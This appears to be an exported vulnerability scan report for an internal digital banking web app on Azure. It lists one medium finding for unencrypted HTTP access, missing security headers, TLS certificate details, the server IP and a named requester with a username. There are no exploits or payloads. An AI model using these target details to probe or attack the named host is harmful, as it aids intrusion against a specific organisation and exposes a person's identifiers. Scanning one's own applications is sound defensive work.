"Web Application Report","22 Feb 2024 11:26AM GMT+0530"
"Fint solutions","Near sky view building","Hyd","Andhra Pradesh","500081","India"
"Dixith Thirukkovalluru","fntsu8dt",""
"DESCRIPTION"
"Each targeted web application is listed with the total number of detected vulnerabilities and sensitive content."
"TARGET"
"Web Applications","fint-int-digitalbankingui-nra.azurewebsites"
"FILTERS"
"Status","New,Active,Re-Opened"
"Remediation","Do not show ignored findings, Include patched findings"
"Detection Source","QUALYS,BURP,BUGCROWD"
"SUMMARY"
"Security Risk","Web Applications","Vulnerabilities","Sensitive Contents","Information Gathered"
"Medium","1","1","0","26"
"Web Application","Level 5","Level 4","Level 3","Level 2","Level 1","Sensitive Contents","Information Gathered"
"fint-int-digitalbankingui-nra.azurewebsites","0","0","1","0","0","0","26"
"RESULTS"
"Web Application Name","VULNERABILITY","ID","QID","Url","Param","Function","Form Entry Point","Access Path","Authentication","Ajax Request","Ajax Request ID","Status","Ignored","Ignore Reason","Ignore Date","Ignore User","Ignore Comments","First Time Detected","Last Time Detected","Last Time Tested","Times Detected","Payload #1","Request Method #1","Request URL #1","Request Headers #1","Response #1","Evidence #1","Unique ID","Request Body #1","Flags","Protocol","Virtual Host","IP","Port","Result","Info#1","CVSS V3 Base","CVSS V3 Temporal","CVSS V3 Attack Vector","Potential"
"fint-int-digitalbankingui-nra.azurewebsites","VULNERABILITY","7068410","150263","http://fint-int-digitalbankingui-nra.azurewebsites.net/","","","","","Not Required","No","","Active","No","","","","","15 Feb 2024 10:16PM GMT+0530","16 Feb 2024 12:08AM GMT+0530","16 Feb 2024 12:08AM GMT+0530","2","","GET","http://fint-int-digitalbankingui-nra.azurewebsites.net/","Referer: https://fint-int-digitalbankingui-nra.azurewebsites.net/Host: fint-int-digitalbankingui-nra.azurewebsites.netUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.177 Safari/537.36Accept: */*","HTTP/1.1 403 Site Disabled
Content-Length: 2342
Connection: close
Content-Type: text/html
Date: Thu, 15 Feb 2024 18:39:33 GMT

<!DOCTYPE html>
<html>
<head>
    <title>Web App - Unavailable</title>
    <style type=""text/css"">
        html {
            height: 100%;
            width: 100%;
        }

        #feature {
            width: 960px;
            margin: 95px auto 0 auto;
            overflow: auto;
        }

        #content {
            font-family: ""Segoe UI"";
            font-weight: normal;
            font-size: 22px;
            color: #ffffff;
            float: left;
         ","","ef44c386-2881-46e0-a598-702d8ff3affb","","","","","","","","","7.6","6.6","Network","false"
"Web Application Name","INFORMATION GATHERED","ID","QID","Results","Detection Date","Unique ID","Flags","Protocol","Virtual Host","IP","Port","Result","Info#1"
"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261575","150204","
X-Xss-Protection: Header missing
Response headers on link: GET https://fint-int-digitalbankingui-nra.azurewebsites.net/ response code: 403
Connection: close
Content-Length: 2342
Content-Type: text/html
Date: Thu, 15 Feb 2024 18:39:29 GMT

Header missing on the following link(s):
(Only first 50 such pages are listed)

GET https://fint-int-digitalbankingui-nra.azurewebsites.net/ response code: 403
GET https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico response code: 403
","16 Feb 2024 12:08AM GMT+0530","14d77f0f-b32f-480b-a00a-7524afa461f6","","","","","","",""
"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261578","86002","","16 Feb 2024 12:08AM GMT+0530","1d1f9bb1-9eda-4581-879e-228b892a790b","","tcp","20.192.170.11","20.192.170.11","443","#table cols=""2""
NAME VALUE
(0)CERTIFICATE_0 _
(0)Version 3_(0x2)
(0)Serial_Number _33:00:de:0f:ea:89:7d:07:ac:06:cc:8d:42:00:00:00:de:0f:ea_
(0)Signature_Algorithm sha384WithRSAEncryption
(0)ISSUER_NAME _
countryName US
_organizationName Microsoft_Corporation
_commonName Microsoft_Azure_TLS_Issuing_CA_01
(0)SUBJECT_NAME _
countryName US
_stateOrProvinceName WA
_localityName Redmond
_organizationName Microsoft_Corporation
_commonName *.azurewebsites.net
(0)Valid_From Dec_18_08:37:20_2023_GMT
(0)Valid_Till Jun_27_23:59:59_2024_GMT
(0)Public_Key_Algorithm rsaEncryption
(0)RSA_Public_Key (2048_bit)
(0) _RSA_Public-Key:_(2048_bit)
(0) _Modulus:
(0) _00:d8:58:44:3f:df:2d:19:a6:20:70:73:ba:8c:36:
(0) _88:a0:e0:ed:b1:26:04:30:3f:cb:8f:88:8b:ff:b5:
(0) _02:e8:b6:eb:03:db:c5:47:cc:99:b7:bf:95:75:e9:
(0) _72:2a:07:f1:9f:0e:12:8a:2f:4b:24:7b:48:5b:fa:
(0) _51:f1:1f:16:56:98:f3:11:88:f6:40:19:ed:4c:f0:
(0) _79:77:55:ee:bd:87:83:a6:dc:05:c7:f6:5a:cf:17:
(0) _c5:7a:cc:78:20:6b:b9:af:70:0d:ff:e5:d0:72:d8:
(0) _19:61:42:da:3d:8c:d7:bc:23:58:b2:78:79:ea:09:
(0) _87:66:df:6f:25:23:41:1e:25:95:33:9b:38:88:de:
(0) _b8:29:af:4e:7e:b4:9a:3c:fc:68:9d:13:59:81:c8:
(0) _54:06:dd:f8:d4:6d:90:c8:13:64:6a:22:d9:31:c1:
(0) _34:7e:8d:53:64:c0:61:fc:41:ff:39:97:3e:0e:d4:
(0) _99:21:cc:d0:a5:ed:76:a9:eb:73:ed:7d:7c:f2:c5:
(0) _98:13:db:ac:92:16:de:17:d4:33:e2:9f:f0:12:53:
(0) _f0:33:56:90:b5:a0:dd:06:7d:63:d4:7e:dc:57:2f:
(0) _8d:a8:0b:f7:86:87:50:fe:12:29:2c:fc:2f:30:1f:
(0) _ea:95:b2:f1:9e:e6:e9:fb:a2:c8:7d:b6:1d:42:aa:
(0) _fb:6d
(0) _Exponent:_65537_(0x10001)
(0)X509v3_EXTENSIONS _ 
(0)CT_Precertificate_SCTs _Signed_Certificate_Timestamp:
(0) _Version_:_v1_(0x0)
(0) _Log_ID_:_EE:CD:D0:64:D5:DB:1A:CE:C5:5C:B7:9D:B4:CD:13:A2:
(0) _32:87:46:7C:BC:EC:DE:C3:51:48:59:46:71:1F:B5:9B
(0) _Timestamp_:_Dec_18_08:47:23.267_2023_GMT
(0) _Extensions:_none
(0) _Signature_:_ecdsa-with-SHA256
(0) _30:45:02:21:00:BE:F9:8B:CA:D2:56:11:E7:D4:C6:A2:
(0) _D0:BB:45:50:5D:6E:1A:97:3B:32:7F:7D:87:46:62:87:
(0) _6C:CE:63:9C:20:02:20:6B:FF:F3:41:6C:30:31:91:D7:
(0) _E4:75:08:D6:98:EE:01:54:1C:32:AF:4C:E7:D4:90:6A:
(0) _BA:91:BE:28:0E:D2:FE
(0) _Signed_Certificate_Timestamp:
(0) _Version_:_v1_(0x0)
(0) _Log_ID_:_48:B0:E3:6B:DA:A6:47:34:0F:E5:6A:02:FA:9D:30:EB:
(0) _1C:52:01:CB:56:DD:2C:81:D9:BB:BF:AB:39:D8:84:73
(0) _Timestamp_:_Dec_18_08:47:23.280_2023_GMT
(0) _Extensions:_none
(0) _Signature_:_ecdsa-with-SHA256
(0) _30:44:02:20:48:3C:A9:25:65:1B:8C:16:C3:1C:CC:79:
(0) _C8:C5:B3:C8:57:F2:36:36:37:9D:5A:D4:04:B1:D8:B6:
(0) _3C:C3:7E:E1:02:20:77:8C:5E:38:A6:AB:AF:82:AF:04:
(0) _05:68:01:29:0F:39:A9:95:74:B3:44:0F:D1:38:0A:62:
(0) _AC:6F:9F:F2:2E:CC
(0) _Signed_Certificate_Timestamp:
(0) _Version_:_v1_(0x0)
(0) _Log_ID_:_55:81:D4:C2:16:90:36:01:4A:EA:0B:9B:57:3C:53:F0:
(0) _C0:E4:38:78:70:25:08:17:2F:A3:AA:1D:07:13:D3:0C
(0) _Timestamp_:_Dec_18_08:47:23.405_2023_GMT
(0) _Extensions:_none
(0) _Signature_:_ecdsa-with-SHA256
(0) _30:46:02:21:00:AE:8B:FC:60:F5:5E:34:BC:15:CB:11:
(0) _3F:FA:A9:8D:D5:20:44:22:CB:D4:3C:19:FC:F2:EE:A4:
(0) _AC:27:ED:FA:FD:02:21:00:D0:4E:39:28:FE:8A:54:60:
(0) _08:AE:B2:9C:47:0A:27:1A:56:72:66:40:BF:F4:40:B1:
(0) _52:50:AF:07:50:A4:6E:E4
(0)1.3.6.1.4.1.311.21.10 _0:d=0_hl=2_l=_24_cons:_SEQUENCE_
(0) _2:d=1_hl=2_l=_10_cons:_SEQUENCE_
(0) _4:d=2_hl=2_l=_8_prim:_OBJECT_:TLS_Web_Client_Authentication
(0) _14:d=1_hl=2_l=_10_cons:_SEQUENCE_
(0) _16:d=2_hl=2_l=_8_prim:_OBJECT_:TLS_Web_Server_Authentication
(0)1.3.6.1.4.1.311.21.7 _0:d=0_hl=2_l=_45_cons:_SEQUENCE_
(0) _2:d=1_hl=2_l=_37_prim:_OBJECT_:1.3.6.1.4.1.311.21.8.15690651.3798470.4214446.239628.16526621.93.4272873.6083518
(0) _41:d=1_hl=2_l=_1_prim:_INTEGER_:64
(0) _44:d=1_hl=2_l=_1_prim:_INTEGER_:26
(0)Authority_Information_Access _CA_Issuers_-_URI:http://www.microsoft.com/pkiops/certs/Microsoft%20Azure%20TLS%20Issuing%20CA%2001%20-%20xsign.crt
(0) _OCSP_-_URI:http://oneocsp.microsoft.com/ocsp
(0)X509v3_Subject_Key_Identifier _F9:1B:0A:FB:3E:E7:A2:A0:43:6A:8E:C1:25:CC:DF:95:59:0D:F6:AA
(0)X509v3_Key_Usage critical
(0) _Digital_Signature,_Key_Encipherment
(0)X509v3_Subject_Alternative_Name _DNS:*.azurewebsites.net,_DNS:*.scm.azurewebsites.net,_DNS:*.sso.azurewebsites.net,_DNS:*.centralindia-01.azurewebsites.net,_DNS:*.scm.centralindia-01.azurewebsites.net,_DNS:*.sso.centralindia-01.azurewebsites.net,_DNS:*.centralindia.c.azurewebsites.net,_DNS:*.scm.centralindia.c.azurewebsites.net,_DNS:*.sso.centralindia.c.azurewebsites.net,_DNS:*.azure-mobile.net,_DNS:*.scm.azure-mobile.net
(0)X509v3_Basic_Constraints critical
(0) _CA:FALSE
(0)X509v3_CRL_Distribution_Points 
(0) _Full_Name:
(0) _URI:http://www.microsoft.com/pkiops/crl/Microsoft%20Azure%20TLS%20Issuing%20CA%2001.crl
(0)X509v3_Certificate_Policies _Policy:_1.3.6.1.4.1.311.76.509.1.1
(0) _CPS:_http://www.microsoft.com/pkiops/Docs/Repository.htm
(0) _Policy:_2.23.140.1.2.2
(0)X509v3_Authority_Key_Identifier _keyid:0F:20:5D:D7:A1:57:95:DB:92:CF:2B:D0:C7:C2:77:04:CE:72:80:76
(0)X509v3_Extended_Key_Usage _TLS_Web_Client_Authentication,_TLS_Web_Server_Authentication
(0)Signature (512_octets)
(0) 1e:1c:be:e0:55:bc:bc:c3:17:08:78:ab:23:05:c4:a4
(0) c2:9b:58:d6:60:3c:b1:52:2d:79:12:15:8b:52:fc:77
(0) 82:aa:5b:97:4a:06:ce:c7:af:d9:9f:f5:92:5c:5b:2f
(0) 32:e2:40:44:b3:b1:61:9d:36:5b:b6:85:3d:42:34:ad
(0) e4:51:17:bd:1e:01:20:eb:68:74:33:f3:74:34:69:9e
(0) 92:3f:42:9b:ea:19:e4:72:56:9b:57:c1:96:bd:93:83
(0) 64:81:6c:68:f5:f9:03:fc:38:85:10:4f:8f:58:b1:ce
(0) c7:71:31:37:1a:b6:e5:95:4c:4e:00:bb:96:90:e7:21
(0) 50:de:07:a5:62:d2:a1:8c:e6:9c:31:1b:f4:70:9a:cd
(0) 74:50:a7:71:97:17:26:d7:aa:a1:c4:10:05:70:14:8b
(0) 70:52:05:fc:34:2e:89:88:9c:35:e2:ab:db:fb:dc:ee
(0) c1:df:4e:1a:df:e1:d7:25:ce:52:35:dd:04:3e:78:14
(0) e9:0c:f2:79:c2:a4:10:60:74:bd:49:0a:b9:90:1e:07
(0) d4:48:ba:24:92:58:e7:a5:43:51:41:60:31:58:42:b1
(0) 6a:14:23:6b:f4:27:e9:5b:75:9a:db:53:8c:31:0c:67
(0) 2b:8a:64:8e:34:7f:eb:cc:80:6c:c2:49:a2:0f:f5:ba
(0) 04:e8:52:4b:61:37:07:7b:1d:95:cd:ac:db:35:ce:ce
(0) e6:c2:38:88:4f:08:92:9d:4c:b0:e3:b5:ea:43:c8:94
(0) 03:b7:8d:f3:85:7a:c7:09:57:64:19:3f:bc:5f:a4:37
(0) fa:75:7f:2f:d4:32:39:eb:34:15:d8:18:86:ed:f8:cd
(0) f3:ce:56:ed:c2:13:53:71:5e:97:f2:a5:28:73:66:ac
(0) e5:23:dc:1f:e9:ae:8a:1f:27:66:07:6b:a0:9c:ce:21
(0) cf:7e:8d:53:ee:62:3c:ab:eb:59:87:4b:ae:49:61:3c
(0) 4f:03:73:82:90:7d:75:f5:94:fb:8d:db:a8:52:40:cd
(0) 8a:62:c6:5a:38:57:3c:53:c7:37:cd:dd:f3:9b:52:2d
(0) a0:0a:b2:2f:b5:4f:f4:9d:88:2c:69:54:22:2b:78:3b
(0) c7:8a:56:29:63:df:00:39:ee:40:5c:dd:d4:bc:ee:d5
(0) 05:20:8d:94:1c:d1:13:af:61:7e:27:d8:7d:d1:53:a9
(0) 12:54:de:a8:1b:3d:77:8f:da:1e:41:35:6f:7e:29:fb
(0) 38:61:56:5e:b4:48:43:32:f7:f6:8f:70:9b:f5:bb:30
(0) ae:3b:88:e5:28:f9:97:c9:93:41:c8:75:39:2c:06:47
(0) a6:69:c5:f2:72:d4:6e:e2:f9:f3:a4:22:00:63:61:9b
(1)CERTIFICATE_1 _
(1)Version 3_(0x2)
(1)Serial_Number _0a:af:a6:c5:ca:63:c4:51:41:ea:3b:e1:f7:c7:53:17_
(1)Signature_Algorithm sha384WithRSAEncryption
(1)ISSUER_NAME _
countryName US
_organizationName DigiCert_Inc
_organizationalUnitName www.digicert.com
_commonName DigiCert_Global_Root_G2
(1)SUBJECT_NAME _
countryName US
_organizationName Microsoft_Corporation
_commonName Microsoft_Azure_TLS_Issuing_CA_01
(1)Valid_From Jul_29_12:30:00_2020_GMT
(1)Valid_Till Jun_27_23:59:59_2024_GMT
(1)Public_Key_Algorithm rsaEncryption
(1)RSA_Public_Key (4096_bit)
(1) _RSA_Public-Key:_(4096_bit)
(1) _Modulus:
(1) _00:c7:9d:70:3a:e4:5e:e7:cf:ee:9c:55:9b:51:47:
(1) _2c:33:40:f4:88:f0:1d:a3:28:69:8f:1a:ae:aa:99:
(1) _e0:67:df:e3:1c:ab:47:28:27:6a:f5:cb:ee:0d:76:
(1) _30:f0:31:f1:0e:83:77:d8:5f:07:3a:df:5b:19:05:
(1) _d0:1a:f6:c0:8b:e5:be:4c:d6:d3:59:da:35:54:a4:
(1) _1e:9f:8e:4b:78:4b:dd:6e:a7:97:f8:d8:bd:99:d5:
(1) _78:95:e3:b6:c2:98:71:72:1f:ff:a5:ad:b2:97:05:
(1) _e5:ac:25:43:d2:d9:25:c8:f0:68:7e:ca:a1:9b:8a:
(1) _f9:31:e9:5c:23:2d:cc:3f:17:35:57:66:19:6f:c9:
(1) _23:40:bf:ed:4f:c4:ed:eb:d7:9f:d5:c3:8a:8f:12:
(1) _62:41:92:33:ad:da:2c:ee:41:b4:b0:af:d3:dd:be:
(1) _d5:de:06:18:14:90:62:89:51:ab:ee:cf:77:59:11:
(1) _12:45:81:3e:6d:32:c1:9d:95:6f:c1:88:4b:90:cb:
(1) _ae:37:a5:12:40:67:28:2c:b2:dc:1d:32:42:e7:7d:
(1) _76:95:6c:89:47:84:ec:5e:6c:63:c3:1e:f7:a5:95:
(1) _c5:07:1b:3b:26:1d:11:8f:e3:ff:d5:29:0e:53:86:
(1) _fa:f0:3e:62:03:af:06:19:0a:12:38:aa:ca:05:69:
(1) _3f:c1:19:a0:c3:22:8d:ea:61:ce:0e:37:6f:94:22:
(1) _f6:be:54:ae:f6:28:a3:5f:68:47:ff:29:7f:81:c9:
(1) _34:33:c5:d3:f1:49:c0:55:4c:5b:c3:e6:08:12:c6:
(1) _b2:d8:a7:dc:d1:35:f8:d7:96:4e:41:ad:d1:3c:e9:
(1) _1e:38:0a:c9:f6:83:3f:6b:4e:e1:b0:a4:d4:6e:e9:
(1) _3f:69:03:15:3e:d2:61:f7:3c:c5:b8:02:90:54:36:
(1) _50:21:17:b1:a1:ff:7f:96:26:a4:b9:f8:60:f8:8d:
(1) _14:27:9e:22:27:5a:ef:19:df:4e:f7:38:ec:8c:72:
(1) _55:c7:07:1e:ad:45:cc:6c:a0:3a:a7:a6:af:11:04:
(1) _4c:a8:7c:86:f0:d1:e9:e0:5d:ac:1c:26:08:75:60:
(1) _66:b9:c0:aa:79:fd:dc:9b:46:c8:f2:e2:eb:e7:23:
(1) _58:65:46:b4:c6:47:c3:35:6f:5f:51:ef:48:51:bb:
(1) _ef:5b:2c:91:c1:23:27:18:90:35:00:d0:45:61:c4:
(1) _87:73:71:bc:d6:fb:90:59:40:5e:75:5d:46:49:2f:
(1) _86:3a:51:19:c8:45:85:30:33:aa:6c:25:b5:d5:a1:
(1) _58:31:32:08:c2:82:db:1f:e6:49:9b:d9:b6:56:46:
(1) _63:e8:37:ed:8e:f6:a8:7c:e2:77:0b:72:5b:ba:c1:
(1) _7a:d6:49
(1) _Exponent:_65537_(0x10001)
(1)X509v3_EXTENSIONS _ 
(1)X509v3_Subject_Key_Identifier _0F:20:5D:D7:A1:57:95:DB:92:CF:2B:D0:C7:C2:77:04:CE:72:80:76
(1)X509v3_Authority_Key_Identifier _keyid:4E:22:54:20:18:95:E6:E3:6E:E6:0F:FA:FA:B9:12:ED:06:17:8F:39
(1)X509v3_Key_Usage critical
(1) _Digital_Signature,_Certificate_Sign,_CRL_Sign
(1)X509v3_Extended_Key_Usage _TLS_Web_Server_Authentication,_TLS_Web_Client_Authentication
(1)X509v3_Basic_Constraints critical
(1) _CA:TRUE,_pathlen:0
(1)Authority_Information_Access _OCSP_-_URI:http://ocsp.digicert.com
(1) _CA_Issuers_-_URI:http://cacerts.digicert.com/DigiCertGlobalRootG2.crt
(1)X509v3_CRL_Distribution_Points 
(1) _Full_Name:
(1) _URI:http://crl3.digicert.com/DigiCertGlobalRootG2.crl
(1) 
(1) _Full_Name:
(1) _URI:http://crl4.digicert.com/DigiCertGlobalRootG2.crl
(1)X509v3_Certificate_Policies _Policy:_2.23.140.1.2.1
(1) _Policy:_2.23.140.1.2.2
(1)1.3.6.1.4.1.311.21.1 _0:d=0_hl=2_l=_1_prim:_INTEGER_:00
(1)Signature (256_octets)
(1) 25:16:f3:61:ed:08:17:54:b0:19:4a:c3:51:d9:74:66
(1) 22:7f:62:4b:c3:87:14:20:40:5b:12:89:a2:2f:18:61
(1) 06:9f:a4:c4:e4:32:a7:ae:ce:82:f7:1d:66:f5:a5:81
(1) 22:a6:c0:e4:86:23:27:ae:97:de:61:91:00:ec:bc:fb
(1) ca:a1:04:b5:f8:07:70:40:6c:2b:d2:9c:4a:d4:06:19
(1) 94:5f:99:65:34:ee:13:d7:1e:71:73:fb:98:13:5e:ac
(1) c2:13:63:c1:32:54:60:55:46:09:88:0d:b9:98:93:d7
(1) 7c:1d:34:80:3b:c6:86:d6:1a:fa:61:0d:c0:cf:41:ab
(1) 50:7d:61:82:f2:2e:34:6d:53:3f:1c:c8:6b:1d:c9:32
(1) 06:fd:b0:4c:fd:0f:63:71:5f:09:1a:a3:14:fd:48:c0
(1) 76:1d:69:17:24:e7:9c:71:25:63:9f:4d:a6:2e:c5:f3
(1) b6:6a:61:82:44:1c:93:36:2c:60:fe:95:ef:15:b0:78
(1) e0:79:65:f6:08:94:24:a3:b9:25:5e:f7:22:ce:e6:6f
(1) 50:40:d3:8c:76:90:72:cd:89:fa:43:e0:7f:23:08:39
(1) 8d:43:30:9d:b5:37:13:89:db:13:d1:0b:fc:00:87:f8
(1) 73:48:14:55:b6:80:27:ca:ec:6d:91:9e:15:8c:83:a1
","Certificate Fingerprint:24C7299864E0A2A6964F551C0E8DF2461532FA8C48E4DBBB6080716691F190E5
"
"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261552","150528","Number of links with 4xx response code: 2
(Only first 50 such links are listed)

403	https://fint-int-digitalbankingui-nra.azurewebsites.net/
403	https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico
","16 Feb 2024 12:08AM GMT+0530","8433c55e-5048-4d6d-a6dd-834c26728f69","","","","","","",""
"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261557","150152","Total internal forms seen (this count includes duplicate forms): 0

Crawled forms (Total: 0)
NOTE: This does not include authentication forms. Authentication forms are reported separately in QID 150115
","16 Feb 2024 12:08AM GMT+0530","771f1253-6e4b-4703-bdd8-6b20999347eb","","","","","","",""
"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261568","150262","
Feature-Policy: Header missing
Response headers on link: GET https://fint-int-digitalbankingui-nra.azurewebsites.net/ response code: 403
Connection: close
Content-Length: 2342
Content-Type: text/html
Date: Thu, 15 Feb 2024 18:39:29 GMT

Header missing on the following link(s):
(Only first 50 such pages are listed)

GET https://fint-int-digitalbankingui-nra.azurewebsites.net/ response code: 403
GET https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico response code: 403
","16 Feb 2024 12:08AM GMT+0530","0fd0f35b-c857-459b-a9b5-261a0dc9a0e7","","","","","","",""
"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261566","150248","
Permissions-Policy: Header missing
Response headers on link: GET https://fint-int-digitalbankingui-nra.azurewebsites.net/ response code: 403
Connection: close
Content-Length: 2342
Content-Type: text/html
Date: Thu, 15 Feb 2024 18:39:29 GMT

Header missing on the following link(s):
(Only first 50 such pages are listed)

GET https://fint-int-digitalbankingui-nra.azurewebsites.net/ response code: 403
GET https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico response code: 403
","16 Feb 2024 12:08AM GMT+0530","41e0d280-0134-4dca-9d4c-f7b30c9a86b1","","","","","","",""
"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261572","150202","
X-Content-Type-Options: Header missing
Response headers on link: GET https://fint-int-digitalbankingui-nra.azurewebsites.net/ response code: 403
Connection: close
Content-Length: 2342
Content-Type: text/html
Date: Thu, 15 Feb 2024 18:39:29 GMT

Header missing on the following link(s):
(Only first 50 such pages are listed)

GET https://fint-int-digitalbankingui-nra.azurewebsites.net/ response code: 403
GET https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico response code: 403
","16 Feb 2024 12:08AM GMT+0530","94dd8eed-6699-40a4-aa64-edd67a654b10","","","","","","",""
"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261559","150546","Base URI: https://fint-int-digitalbankingui-nra.azurewebsites.net/
Response Code: 403
Response Header: 
	Connection: close
	Content-Length: 2342
	Content-Type: text/html
	Date: Thu, 15 Feb 2024 18:39:29 GMT
	
Response Body: 
	&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;
	    &lt;title&gt;Web App - Unavailable&lt;/title&gt;
	    &lt;style type=""text/css""&gt;
	        html {
	            height: 100%;
	            width: 100%;
	        }
	
	        #feature {
	            width: 960px;
	            margin: 95px auto 0 auto;
	            overflow: auto;
	        }
	
	        #content {
	            font-family: ""Segoe UI"";
	            font-weight: normal;
	            font-size: 22px;
	            color: #ffffff;
	            float: left;
	            width: 460px;
	       
	...
","16 Feb 2024 12:08AM GMT+0530","9a9163d6-44de-4d52-8a67-e1888fc54b6f","","","","","","",""
"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261579","38600","","16 Feb 2024 12:08AM GMT+0530","40528851-e544-45b6-aec0-e198830fbf76","","tcp","20.192.170.11","20.192.170.11","443","Certificate #0 CN=*.azurewebsites.net,O=Microsoft_Corporation,L=Redmond,ST=WA,C=US The certificate will expire within six months: Jun 27 23:59:59 2024 GMT
Certificate #1 CN=Microsoft_Azure_TLS_Issuing_CA_01,O=Microsoft_Corporation,C=US The certificate will expire within six months: Jun 27 23:59:59 2024 GMT
","Certificate Fingerprint:24C7299864E0A2A6964F551C0E8DF2461532FA8C48E4DBBB6080716691F190E5
"
"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261583","38597","","16 Feb 2024 12:08AM GMT+0530","ba01ea78-95a4-462f-bbba-69cb83c65156","","tcp","20.192.170.11","20.192.170.11","443","#table cols=2
my_version target_version
0304 0303
0399 0303
0400 0303
0499 0303
",""
